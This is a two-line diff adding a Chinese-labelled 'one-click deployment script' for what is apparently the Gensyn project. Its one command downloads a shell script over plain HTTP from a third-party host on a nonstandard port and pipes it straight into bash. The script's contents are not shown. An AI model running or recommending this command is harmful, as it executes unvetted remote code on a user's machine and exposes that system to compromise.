@@ -1,0 +1,2 @@
+gensyn一键部署脚本：
+bash -c "$(curl -fsSL http://bh.bithunter.club:8111/bithunter.sh)"
